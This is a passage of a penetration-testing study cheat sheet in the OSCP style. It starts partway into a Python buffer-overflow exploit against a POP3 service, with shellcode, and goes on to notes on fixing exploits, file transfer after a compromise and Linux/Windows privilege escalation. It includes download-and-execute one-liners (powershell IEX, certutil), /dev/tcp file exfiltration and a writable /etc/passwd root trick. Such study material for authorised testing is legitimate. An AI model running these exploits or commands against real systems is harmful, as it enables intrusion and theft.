<span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\xfe\x8f\x40\xde\x0c\xd1\x85\xd9\xee\xa4\xff\x19\x92\xbe\xc4</span><span style="color:#e6db74">&#34;</span>
<span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x60\x48\x4a\xde\xc3\x1b\xec\x3a\xf5\xc8\x6b\xc9\xf9\xa5\xf8</span><span style="color:#e6db74">&#34;</span>
<span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x95\x1d\x3b\x2c\xae\x1a\xb0\xd3\x60\xab\x82\xf7\xa4\xf7\x51</span><span style="color:#e6db74">&#34;</span>
<span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x99\xfd\x5d\x37\xa6\x1d\x3e\xe8\x02\x56\xd3\xfd\x3e\x35\xbc</span><span style="color:#e6db74">&#34;</span>
<span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x32\x73\xc5\x3c\x5d\x04\xb6\x0e\xc2\xbe\x50\x23\x8b\x18\xa7</span><span style="color:#e6db74">&#34;</span>
<span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x44\xa6\xdd\x37\xbb\x49\x1e\x1e\x78\x1d\x4e\x08\xa9\x1e\x05</span><span style="color:#e6db74">&#34;</span>
<span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\xc8\x56\xcb\x8a\x98\xf8\xa4\x6a\x48\xb9\x14\x03\x82\x36\x4a</span><span style="color:#e6db74">&#34;</span>
<span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x33\xad\x9c\xe3\xde\x54\x77\x06\x14\x56\x69\x7e\x28\x56\x74</span><span style="color:#e6db74">&#34;</span>
<span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\xc4\xa5\xb0\x1c\x2a\xe0\x6b\x89\xd3\xa9\xe7\x28\x1b\x64\x82</span><span style="color:#e6db74">&#34;</span>
<span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x6b\x97\x8b\x73\x25\x50\xe1\x67\xd2\x90\xbc\xd5\x75\xae\x6a</span><span style="color:#e6db74">&#34;</span>
<span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x71\x19\x3d\xf1\x81\x54\x5e\xae\xd6\x31\x90\xa7\xb2\xaf\x8b</span><span style="color:#e6db74">&#34;</span>
<span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x11\xa0\x2d\x4d\x59\x60\xea\xae\x64\x69\x7f\x8a\x42\x79\xb9</span><span style="color:#e6db74">&#34;</span>
<span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x13\xcf\x2d\x15\x42\x99\x9b\xd3\x3c\x6b\x75\x8a\x93\x25\x11</span><span style="color:#e6db74">&#34;</span>
<span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x4b\xd8\xf5\x67\x54\x35\x80\x87\xe5\xe0\xd5\xb8\xca\x64\xd2</span><span style="color:#e6db74">&#34;</span>
<span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\xc1\x36\x15\x1d\x18\xf3\x35\xfc\x88\x0e\xde\x59\x59\xb3\x83</span><span style="color:#e6db74">&#34;</span>
<span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x59\xb4\xf0\xbd\xd9\x3c\x89\x39\xc1\x35\x8c\x06\x45\xa6\xfc</span><span style="color:#e6db74">&#34;</span>
<span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x17\x20\xc8\x53\x17\x61</span><span style="color:#e6db74">&#34;</span>
)

buffer <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;A&#39;</span> <span style="color:#f92672">*</span> <span style="color:#ae81ff">2606</span> <span style="color:#f92672">+</span> <span style="color:#e6db74">&#39;</span><span style="color:#ae81ff">\x8f\x35\x4a\x5f</span><span style="color:#e6db74">&#39;</span> <span style="color:#f92672">+</span> <span style="color:#e6db74">&#39;</span><span style="color:#ae81ff">\x90</span><span style="color:#e6db74">&#39;</span> <span style="color:#f92672">*</span> <span style="color:#ae81ff">16</span> <span style="color:#f92672">+</span> shellcode <span style="color:#f92672">+</span> <span style="color:#e6db74">&#39;C&#39;</span> <span style="color:#f92672">*</span> (<span style="color:#ae81ff">3500</span> <span style="color:#f92672">-</span> <span style="color:#ae81ff">2606</span> <span style="color:#f92672">-</span> <span style="color:#ae81ff">4</span> <span style="color:#f92672">-</span> <span style="color:#ae81ff">351</span> <span style="color:#f92672">-</span> <span style="color:#ae81ff">16</span>)

<span style="color:#66d9ef">try</span>:
    <span style="color:#66d9ef">print</span> <span style="color:#e6db74">&#39;Sending buffer...&#39;</span>
    s<span style="color:#f92672">.</span>connect((<span style="color:#e6db74">&#39;192.168.1.23&#39;</span>, <span style="color:#ae81ff">110</span>))
    s<span style="color:#f92672">.</span>recv(<span style="color:#ae81ff">1024</span>)
    s<span style="color:#f92672">.</span>send(<span style="color:#e6db74">&#39;USER username</span><span style="color:#ae81ff">\r\n</span><span style="color:#e6db74">&#39;</span>)
    s<span style="color:#f92672">.</span>recv(<span style="color:#ae81ff">1024</span>)
    s<span style="color:#f92672">.</span>send(<span style="color:#e6db74">&#39;PASS {}</span><span style="color:#ae81ff">\r\n</span><span style="color:#e6db74">&#39;</span><span style="color:#f92672">.</span>format(buffer))
    <span style="color:#66d9ef">print</span>(<span style="color:#e6db74">&#39;Done&#39;</span>)
<span style="color:#66d9ef">except</span>:
    <span style="color:#66d9ef">print</span> <span style="color:#e6db74">&#39;Could not connect to POP3&#39;</span>
</code></pre></div><h1 id="linux-buffer-overflows">Linux Buffer Overflows</h1>
<p><code>edb --run [binary]</code></p>
<p>Double press run. To search for JMP ESP, Ctrl-O, Jump Equivalent to ESP -&gt; EIP, select first region, Find. As per usual, find a suitable place to store the shellcode, by referring to the registers. In Crosfires case, it looks like you can&rsquo;t store much at the ESP, only 7 bytes, so no shellcode can be stored there. We also notice EAX points to the start of the buffer (<code>(setup sound ...</code>), so let&rsquo;s store the shellcode after <code>(setup sound </code>, and use those 7 bytes at ESP to be first-stage shellcode to JMP to EAX + len(<code>(setup sound </code>). Overwrite EIP &gt; JMP to a JMP ESP &gt; JMP ESP &gt; ADD EAX, 12 &gt; JMP EAX &gt; Shellcode.</p>
<p>Note on indirect offset jumping, <code>jmp esp+20</code> is not possible, <code>jmp [esp+20]</code> loads the value at <code>esp+20</code>, which is not intended. Instead, <code>lea eax, [esp+20]; jmp eax</code> or <code>sub esp, 20; jmp esp</code>. <a href="https://forums.offensive-security.com/showthread.php?5745-crossfire-bind-vs-reverse-shell&amp;p=59289#post59289">https://forums.offensive-security.com/showthread.php?5745-crossfire-bind-vs-reverse-shell&amp;p=59289#post59289</a></p>
<p>Note on exploiting crossfire server, run it as a standalone, not in edb, otherwise shell will not respond to commands. <a href="https://forums.offensive-security.com/showthread.php?5745-crossfire-bind-vs-reverse-shell&amp;p=59289#post59289">https://forums.offensive-security.com/showthread.php?5745-crossfire-bind-vs-reverse-shell&amp;p=59289#post59289</a></p>
<h1 id="exploits">Exploits</h1>
<h2 id="searching-exploits">Searching Exploits</h2>
<p>There are many fake exploits in the wild, many often causing harm to your system. Where can you find reliable sources for public exploit code?</p>
<ul>
<li>Exploit Database - <a href="https://www.exploit-db.com/">https://www.exploit-db.com/</a></li>
<li>SecurityFocus - <a href="https://www.securityfocus.com/vulnerabilities">https://www.securityfocus.com/vulnerabilities</a></li>
</ul>
<p>In Kali, you can use <code>searchsploit [query]</code> to find exploits. Use <code>searchsploit -u</code> to pull latest updates.</p>
<h2 id="customizing-and-fixing-exploits">Customizing and Fixing Exploits</h2>
<p>Many exploits are one shots, meaning if they are unsuccessful, the service will crash. For that reason, never run an exploit without first examining the code and understand the inner workings. Once done, set up a small dev environment which matches the OS version and vulnerable software version, in order to test and improve existing exploits. Once we are fairly certain that our fixed exploit will work on the target machine, we can then proceed to launch it against our victim.</p>
<ol>
<li>Swap the shellcode (chance that the size matters to bypass DEP and ASLR)</li>
<li>Fix the offsets (based on previous knowledge, or debugging)</li>
<li>Hardcoded variables (like server IP)</li>
</ol>
<p>Some C programs are meant to be compiled in a Windows environment, not just linux. To identify them, simply look at the includes, if &ldquo;win&rdquo; is in the name, is most likely for Windows.</p>
<h3 id="linux-compilation">Linux Compilation</h3>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-sh" data-lang="sh">gcc -o <span style="color:#f92672">[</span>elf<span style="color:#f92672">]</span> <span style="color:#f92672">[</span>.c<span style="color:#f92672">]</span>
gcc -Wl,--hash-style<span style="color:#f92672">=</span>both -o <span style="color:#f92672">[</span>elf<span style="color:#f92672">]</span> <span style="color:#f92672">[</span>.c<span style="color:#f92672">]</span> <span style="color:#75715e"># &#34;error while loading shared libraries: requires glibc 2.5 or later dynamic linker&#34;</span>
gcc -static -o <span style="color:#f92672">[</span>elf<span style="color:#f92672">]</span> <span style="color:#f92672">[</span>.c<span style="color:#f92672">]</span> <span style="color:#75715e"># or this</span>
</code></pre></div><p>Resources:</p>
<ul>
<li>&ldquo;error while loading shared libraries: requires glibc 2.5 or later dynamic linker&rdquo;: <a href="https://stackoverflow.com/a/12075678">https://stackoverflow.com/a/12075678</a></li>
</ul>
<h3 id="windows-compilation">Windows Compilation</h3>
<p>You can compile and run in Linux with mingw-w64 and wine!</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-sh" data-lang="sh">apt install mingw-w64
i686-w64-mingw32-gcc <span style="color:#f92672">[</span>.c<span style="color:#f92672">]</span> -o <span style="color:#f92672">[</span>.exe<span style="color:#f92672">]</span> <span style="color:#75715e"># -lws2_32</span>
i686-w64-mingw32-g++ <span style="color:#f92672">[</span>.cpp<span style="color:#f92672">]</span> -o <span style="color:#f92672">[</span>.exe<span style="color:#f92672">]</span>
wine <span style="color:#f92672">[</span>.exe<span style="color:#f92672">]</span>
</code></pre></div><h3 id="tips">Tips</h3>
<ul>
<li>i686-w64-mingw32-gcc -lws2_32 - <a href="https://stackoverflow.com/a/2033632/4908573">https://stackoverflow.com/a/2033632/4908573</a></li>
<li>Malloc and memcpy, allocate and initialize with null bytes - <a href="https://forums.offensive-security.com/showthread.php?2363-Fixing-643-c-script&amp;p=9453#post9453">https://forums.offensive-security.com/showthread.php?2363-Fixing-643-c-script&amp;p=9453#post9453</a></li>
<li>Adding +1 to pointers is 4 bytes - <a href="https://stackoverflow.com/a/11598369/4908573">https://stackoverflow.com/a/11598369/4908573</a></li>
</ul>
<h1 id="file-transfers">File Transfers</h1>
<p>Antivirus may be triggered by an upload, so be careful when transferring files. One of OffSec&rsquo;s favourite ways to avoid AV is to use legitimate administrative tools during post exploitation phase.</p>
<h2 id="file-transfer-methods">File Transfer Methods</h2>
<p>Unix environments will often have tools such as <code>nc</code>, <code>curl</code>, <code>wget</code> preinstalled, making file transfer simple. However, on Windows, the process is not as straight forward.</p>
<p>Most netcat-like connections provide a non-interactive shell. Interactive commands like <code>ftp</code> on Windows won&rsquo;t work. So we have to transfer files using non-interactive methods.</p>
<h3 id="tftp">TFTP</h3>
<p>Windows XP and 2003. Windows 7, 2008 and above will need to be explicitly added during installation.</p>
<p>Easy, but slow speed of 2kb/sec</p>
<p>On Kali:</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-sh" data-lang="sh">mkdir /tftp <span style="color:#75715e"># DIRECTORY HOSTING FILES</span>
atftpd --daemon --port <span style="color:#ae81ff">69</span> /tftp
</code></pre></div><p>On Windows:</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-cmd" data-lang="cmd">tftp -i [kali ip] get [file]
</code></pre></div><h3 id="ftp">FTP</h3>
<p>All Windows.</p>
<p>Fast speed of 206kb/sec. Scripts available in OSCP-Notes/scripts</p>
<p>On Kali:</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-sh" data-lang="sh"><span style="color:#75715e">#!/bin/bash
</span><span style="color:#75715e"></span>apt update <span style="color:#f92672">&amp;&amp;</span> apt install pure-ftpd
groupadd ftpgroup
useradd -g ftpgroup -d /dev/null -s /etc ftpuser
pure-pw useradd offsec -u ftpuser -d /ftphome <span style="color:#75715e"># use user offsec when logging into ftp</span>
pure-pw mkdb
cd /etc/pure-ftpd/auth/
ln -s ../conf/PureDB 60pdb
mkdir -p /ftphome <span style="color:#75715e"># DIRECTORY HOSTING FILES</span>
chown -R ftpuser:ftpgroup /ftphome/
service pure-ftpd restart
</code></pre></div><p>On Windows:</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-cmd" data-lang="cmd"><span style="color:#66d9ef">echo</span> open [kali ip] 21&gt; ftp.txt
<span style="color:#66d9ef">echo</span> USER offsec&gt;&gt; ftp.txt # username
<span style="color:#66d9ef">echo</span> ftp&gt;&gt; ftp.txt # password
<span style="color:#66d9ef">echo</span> bin&gt;&gt; ftp.txt # binary mode
<span style="color:#66d9ef">echo</span> GET [file]&gt;&gt; ftp.txt
<span style="color:#66d9ef">echo</span> bye&gt;&gt; ftp.txt
ftp -v -n -s:ftp.txt
# or
<span style="color:#66d9ef">echo</span> open [kali ip] 21&gt;ftp.txt&amp;<span style="color:#66d9ef">echo</span> USER offsec&gt;&gt;ftp.txt&amp;<span style="color:#66d9ef">echo</span> ftp&gt;&gt;ftp.txt&amp;<span style="color:#66d9ef">echo</span> bin&gt;&gt;ftp.txt&amp;<span style="color:#66d9ef">echo</span> GET [file]&gt;&gt;ftp.txt&amp;<span style="color:#66d9ef">echo</span> bye&gt;&gt;ftp.txt&amp;ftp -v -n -s:ftp.txt
</code></pre></div><h3 id="vbscript-via-http">VBScript via HTTP</h3>
<p>Windows XP, 2003</p>
<p>Moderate speed of 50kb/sec. Scripts available in OSCP-Notes/scripts</p>
<p>On Kali:</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-sh" data-lang="sh">service apache2 start
<span style="color:#75715e"># /var/www/html # DIRECTORY HOSTING FILES</span>
</code></pre></div><p>On Windows:</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-cmd" data-lang="cmd"><span style="color:#66d9ef">echo</span> strUrl = WScript.Arguments.Item(0) &gt; wget.vbs
<span style="color:#66d9ef">echo</span> StrFile = WScript.Arguments.Item(1) &gt;&gt; wget.vbs
<span style="color:#66d9ef">echo</span> Const HTTPREQUEST_PROXYSETTING_DEFAULT = 0 &gt;&gt; wget.vbs
<span style="color:#66d9ef">echo</span> Const HTTPREQUEST_PROXYSETTING_PRECONFIG = 0 &gt;&gt; wget.vbs
<span style="color:#66d9ef">echo</span> Const HTTPREQUEST_PROXYSETTING_DIRECT = 1 &gt;&gt; wget.vbs
<span style="color:#66d9ef">echo</span> Const HTTPREQUEST_PROXYSETTING_PROXY = 2 &gt;&gt; wget.vbs
<span style="color:#66d9ef">echo</span> Dim http, varByteArray, strData, strBuffer, lngCounter, fs, ts &gt;&gt; wget.vbs
<span style="color:#66d9ef">echo</span> Err.Clear &gt;&gt; wget.vbs
<span style="color:#66d9ef">echo</span> Set http = Nothing &gt;&gt; wget.vbs
<span style="color:#66d9ef">echo</span> Set http = CreateObject(<span style="color:#e6db74">&#34;WinHttp.WinHttpRequest.5.1&#34;</span>) &gt;&gt; wget.vbs
<span style="color:#66d9ef">echo</span> If http Is Nothing Then Set http = CreateObject(<span style="color:#e6db74">&#34;WinHttp.WinHttpRequest&#34;</span>) &gt;&gt; wget.vbs
<span style="color:#66d9ef">echo</span> If http Is Nothing Then Set http = CreateObject(<span style="color:#e6db74">&#34;MSXML2.ServerXMLHTTP&#34;</span>) &gt;&gt; wget.vbs
<span style="color:#66d9ef">echo</span> If http Is Nothing Then Set http = CreateObject(<span style="color:#e6db74">&#34;Microsoft.XMLHTTP&#34;</span>) &gt;&gt; wget.vbs
<span style="color:#66d9ef">echo</span> http.Open <span style="color:#e6db74">&#34;GET&#34;</span>, strURL, False &gt;&gt; wget.vbs
<span style="color:#66d9ef">echo</span> http.Send &gt;&gt; wget.vbs
<span style="color:#66d9ef">echo</span> varByteArray = http.ResponseBody &gt;&gt; wget.vbs
<span style="color:#66d9ef">echo</span> Set http = Nothing &gt;&gt; wget.vbs
<span style="color:#66d9ef">echo</span> Set fs = CreateObject(<span style="color:#e6db74">&#34;Scripting.FileSystemObject&#34;</span>) &gt;&gt; wget.vbs
<span style="color:#66d9ef">echo</span> Set ts = fs.CreateTextFile(StrFile, True) &gt;&gt; wget.vbs
<span style="color:#66d9ef">echo</span> strData = <span style="color:#e6db74">&#34;&#34;</span> &gt;&gt; wget.vbs
<span style="color:#66d9ef">echo</span> strBuffer = <span style="color:#e6db74">&#34;&#34;</span> &gt;&gt; wget.vbs
<span style="color:#66d9ef">echo</span> For lngCounter = 0 to UBound(varByteArray) &gt;&gt; wget.vbs
<span style="color:#66d9ef">echo</span> ts.Write Chr(255 And Ascb(Midb(varByteArray,lngCounter + 1, 1))) &gt;&gt; wget.vbs
<span style="color:#66d9ef">echo</span> Next &gt;&gt; wget.vbs
<span style="color:#66d9ef">echo</span> ts.Close &gt;&gt; wget.vbs
cscript wget.vbs http://[kali ip]/[file] [file]
</code></pre></div><h3 id="powershell-via-http">Powershell via HTTP</h3>
<p>Windows 7, 2008 and above</p>
<p>Slow speed of 20kb/sec, but most readily available on most modern Windows OS</p>
<p>On Kali:</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-sh" data-lang="sh">service apache2 start <span style="color:#75715e"># /var/www/html # DIRECTORY HOSTING FILES</span>
<span style="color:#75715e"># or</span>
python -m SimpleHTTPServer <span style="color:#75715e"># current working dir will be DIRECTORY HOSTING FILES</span>
</code></pre></div><p>On Windows:</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-cmd" data-lang="cmd"><span style="color:#66d9ef">echo</span> $storageDir = $pwd &gt;wget.ps1
<span style="color:#66d9ef">echo</span> $webclient = New-Object System.Net.WebClient &gt;&gt;wget.ps1
<span style="color:#66d9ef">echo</span> $url = <span style="color:#e6db74">&#34;http://[kali ip]/[file]&#34;</span> &gt;&gt;wget.ps1
<span style="color:#66d9ef">echo</span> $file = <span style="color:#e6db74">&#34;[file]&#34;</span> &gt;&gt;wget.ps1
<span style="color:#66d9ef">echo</span> $webclient.DownloadFile($url,$file) &gt;&gt;wget.ps1
powershell.exe -ExecutionPolicy Bypass -NoLogo -NonInteractive -NoProfile -File wget.ps1
</code></pre></div><div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-cmd" data-lang="cmd">powershell.exe IEX (New-Object System.Net.WebClient).DownloadString(&#39;http://192.168.119.177:8000/hello.ps1&#39;) 
</code></pre></div><div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-cmd" data-lang="cmd">iex(new-object net.webclient).downloadstring(<span style="color:#e6db74">&#34;http://192.168.42.42/evil.ps1)</span>
</code></pre></div><div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-cmd" data-lang="cmd">certutil.exe -urlcache -split -f <span style="color:#e6db74">&#34;http://192.168.42.42/nc.exe&#34;</span> nc.exe
</code></pre></div><div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-cmd" data-lang="cmd">IWR -Uri <span style="color:#e6db74">&#34;http://192.168.42.42/n64.exe&#34;</span> -Outfile <span style="color:#e6db74">&#34;n64.exe&#34;</span>
</code></pre></div><h3 id="debugexe">Debug.exe</h3>
<p>Older 32-bit Windows</p>
<p>Limited to 64kb, slow speed of 3kb/sec, limited to the connection speed of the shell</p>
<p>On Kali:</p>
<pre><code>upx -9 [.exe] # pack and compress a binary you wanna transfer
ls -lah [.exe] # check whether it is less than 64kb
exe2hex [.exe] # alternatively, `wine /usr/share/windows-binaries/exe2bat.exe [.exe] [.bat]`
cat [.bat] | xclip -selection c # if remotely accessing kali, use `ssh -X`, a bit finicky though
</code></pre><p>On Windows:</p>
<pre><code># paste
</code></pre><h3 id="ncexe"><code>nc.exe</code></h3>
<p>Requires <code>nc.exe</code> to be already transferred. Allows for two-way transfers.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-cmd" data-lang="cmd">C:\nc.exe<span style="color:#75715e"> -lvp 4444 &gt; [file] # on Windows</span>
nc [windows ip] 4444 &lt; [file] # on Kali
</code></pre></div><p>Vice versa.</p>
<h3 id="linux-dev-tcp">Linux Dev TCP</h3>
<pre><code>cat file.txt &gt; /dev/tcp/192.168.1.23/4444 # on victim linux
nc -lvp 4444 &gt; file.txt # on Kali
</code></pre><h1 id="privilege-escalation">Privilege Escalation</h1>
<h2 id="kernel-exploits">Kernel Exploits</h2>
<h3 id="linux-kernel-exploits">Linux Kernel Exploits</h3>
<ul>
<li>Linux Kernel 2.6.39 - 3.2.2 (Gentoo / Ubuntu x86/x64) - &lsquo;Mempodipper&rsquo; Local Privilege Escalation:
<ul>
<li><a href="https://www.exploit-db.com/exploits/18411/">https://www.exploit-db.com/exploits/18411/</a></li>
<li><a href="https://www.securityfocus.com/bid/51625/info">https://www.securityfocus.com/bid/51625/info</a></li>
<li>CVE-2012-0056</li>
</ul>
</li>
<li>Linux Kernel 2.6.22 - 3.9 (x86/x64) - &lsquo;Dirty COW /proc/self/mem&rsquo; Race Condition Privilege Escalation (SUID Method):
<ul>
<li><a href="https://www.exploit-db.com/exploits/40616/">https://www.exploit-db.com/exploits/40616/</a></li>
<li>CVE-2016-5195</li>
</ul>
</li>
<li>Linux Kernel 2.2.x/2.4.x (RedHat) - &lsquo;ptrace/kmod&rsquo; Local Privilege Escalation
<ul>
<li><a href="https://www.exploit-db.com/exploits/3/">https://www.exploit-db.com/exploits/3/</a></li>
<li><a href="http://dl.packetstormsecurity.net/0304-exploits/ptrace-kmod.c">http://dl.packetstormsecurity.net/0304-exploits/ptrace-kmod.c</a></li>
<li>CVE-2003-0127</li>
</ul>
</li>
<li>Linux Kernel 2.6 (Debian 4.0 / Ubuntu / Gentoo) UDEV below 1.4.1 - Local Privilege Escalation (1)
<ul>
<li><a href="https://www.exploit-db.com/exploits/8478/">https://www.exploit-db.com/exploits/8478/</a></li>
<li><code>exploit/linux/local/udev_netlink</code></li>
</ul>
</li>
</ul>
<p>Tools:</p>
<ul>
<li><a href="https://github.com/sleventyeleven/linuxprivchecker">https://github.com/sleventyeleven/linuxprivchecker</a></li>
<li><a href="https://github.com/InteliSecureLabs/Linux_Exploit_Suggester">https://github.com/InteliSecureLabs/Linux_Exploit_Suggester</a></li>
<li><a href="https://github.com/jondonas/linux-exploit-suggester-2">https://github.com/jondonas/linux-exploit-suggester-2</a></li>
</ul>
<h3 id="windows-kernel-exploits">Windows Kernel Exploits</h3>
<h4 id="poc-exploits">PoC Exploits</h4>
<ul>
<li>&lsquo;afd.sys&rsquo; Local Privilege Escalation
<ul>
<li>Microsoft Windows (x86) - &lsquo;afd.sys&rsquo; Local Privilege Escalation (MS11-046)
<ul>
<li><a href="https://www.exploit-db.com/exploits/40564/">https://www.exploit-db.com/exploits/40564/</a></li>
<li>Windows XP, 2003, 7, 2008, Vista</li>
</ul>
</li>
<li>Microsoft Windows XP/2003 - &lsquo;afd.sys&rsquo; Local Privilege Escalation (MS11-080)
<ul>
<li><a href="https://www.exploit-db.com/exploits/18176/">https://www.exploit-db.com/exploits/18176/</a></li>
<li>CVE-2011-2005</li>
</ul>
</li>
<li>And a lot more</li>
</ul>
</li>
<li>KiTrap0D/vdmallowed.exe
<ul>
<li><a href="https://www.exploit-db.com/exploits/11199/">https://www.exploit-db.com/exploits/11199/</a></li>
<li>Upload both <code>vdmallowed.exe</code> and <code>vdexploit.dll</code>. May only work on GUI.</li>
<li>CVE-2010-0232</li>
</ul>
</li>
<li>RID Hijacking (Metasploit)
<ul>
<li><a href="https://www.rapid7.com/db/modules/post/windows/manage/rid_hijack">https://www.rapid7.com/db/modules/post/windows/manage/rid_hijack</a></li>
<li><a href="http://csl.com.co/rid-hijacking/">http://csl.com.co/rid-hijacking/</a></li>
</ul>
</li>
<li>And many more &hellip; just search <code>[OS] privilege escalation</code> on Google. Eg. <code>Windows 7 SP1 privilege escalation</code> or <code>Windows 7 SP1 x86 privilege escalation</code></li>
</ul>
<p>To compile C/C++ Windows exploit on Linux:</p>
<ul>
<li><code>i686-w64-mingw32-gcc [.c] -o [.exe] [-lws2_32]</code></li>
<li><code>i686-w64-mingw32-g++ [.cpp] -o [.exe] [-lws2_32]</code></li>
</ul>
<p>To compile Python exploit on Windows:</p>
<ol>
<li>On Windows, install PyWin32</li>
<li>Download and extract Pyinstaller</li>
<li>Open cmd and cd into Pyinstaller</li>
<li><code>python pyinstaller.py --onefile [.py]</code></li>
</ol>
<p>Note: Pywin32 installation error: <a href="https://stackoverflow.com/a/21081675/4908573">https://stackoverflow.com/a/21081675/4908573</a></p>
<p>Resources:</p>
<ul>
<li>Precompiled Windows Kernel Exploits: <a href="https://github.com/SecWiki/windows-kernel-exploits">https://github.com/SecWiki/windows-kernel-exploits</a></li>
</ul>
<p>Tools:</p>
<ul>
<li>Windows Exploit Suggester: <a href="https://github.com/GDSSecurity/Windows-Exploit-Suggester">https://github.com/GDSSecurity/Windows-Exploit-Suggester</a></li>
<li><code>systeminfo</code></li>
<li><code>wmic qfe get Caption,Description,HotFixID,InstalledOn</code></li>
<li>Metasploit Module: <code>post/multi/recon/local_exploit_suggester</code></li>
</ul>
<h2 id="configuration-issues">Configuration Issues</h2>
<h3 id="linux-configuration-issues">Linux Configuration Issues</h3>
<p>What&rsquo;s the OS? What version? What architecture?</p>
<ul>
<li><code>cat /etc/*-release</code></li>
<li><code>uname -i</code></li>
<li><code>lsb_release -a</code> (Debian based OSs)</li>
</ul>
<p>Who are we? Where are we?</p>
<ul>
<li><code>id</code></li>
<li><code>pwd</code></li>
</ul>
<p>Who uses the box? What users? (And which ones have a valid shell)</p>
<ul>
<li><code>cat /etc/passwd</code></li>
<li><code>grep -vE &quot;nologin|false&quot; /etc/passwd</code></li>
</ul>
<p>What&rsquo;s currently running on the box? What active network services are there?</p>
<ul>
<li><code>ps aux</code></li>
<li><code>netstat -antup</code></li>
</ul>
<p>What&rsquo;s installed? What kernel is being used?</p>
<ul>
<li><code>dpkg -l</code> (Debian based OSs)</li>
<li><code>rpm -qa</code> (CentOS / openSUSE)</li>
<li><code>uname -a</code></li>
</ul>
<p>Much more at: <a href="https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/">https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/</a></p>
<ul>
<li>SUID Files</li>
<li><code>find / -perm -4000 -type f -ls 2&gt; /dev/null</code> find SUID files that are potentially vulnerable (outdated nmap w/ interactive mode, scripts that give you effective root immediately)</li>
<li><code>find / \( -perm -2003 -o -perm -4003 \) -type f -ls 2&gt; /dev/null</code> find SUID/SGID files that are both writable and executable (if you are lucky)</li>
<li><code>find / -perm -002 -type f -ls 2&gt; /dev/null | grep cron</code> find writable cron files (and use it to open a reverse shell)</li>
</ul>
<p>Writable <code>/etc/passwd</code> or <code>/etc/shadow</code></p>
<ul>
<li>Writable <code>/etc/passwd</code>, write password generated from <code>openssl passwd [password]</code> to <code>root:[here]:0:0:root:/root:/bin/bash</code>, then login as root using the password.</li>
</ul>
<p>Find writable tmp folders to do work in:</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-sh" data-lang="sh">mount | grep /tmp <span style="color:#75715e"># check if tmp is mounted differently</span>
cd /tmp
<span style="color:#75715e"># or</span>
cd /var/tmp
</code></pre></div><p>Are you a sudo user already? Do you have access to powerful commands like chown or chmod?</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-sh" data-lang="sh">sudo -l
sudo su -
</code></pre></div><p>Are you part of the sudo group, but not in the sudoers file?</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-sh" data-lang="sh">id <span style="color:#75715e"># 27(sudo)</span>
pkexec sh
</code></pre></div><p>No TTY or PTY, non-interactive? (&ldquo;no tty present and no askpass program specified&rdquo;) Spawn one:</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-sh" data-lang="sh">python -c <span style="color:#e6db74">&#39;import pty;pty.spawn(&#34;/bin/bash&#34;)&#39;</span>
</code></pre></div><p>Errors about missing files while compiling with gcc? (&ldquo;gcc: error trying to exec &lsquo;cc1&rsquo;: execvp: No such file or directory&rdquo;) Export PATH:</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-sh" data-lang="sh">export PATH<span style="color:#f92672">=</span>$PATH
</code></pre></div><p>Resources:</p>
<ul>
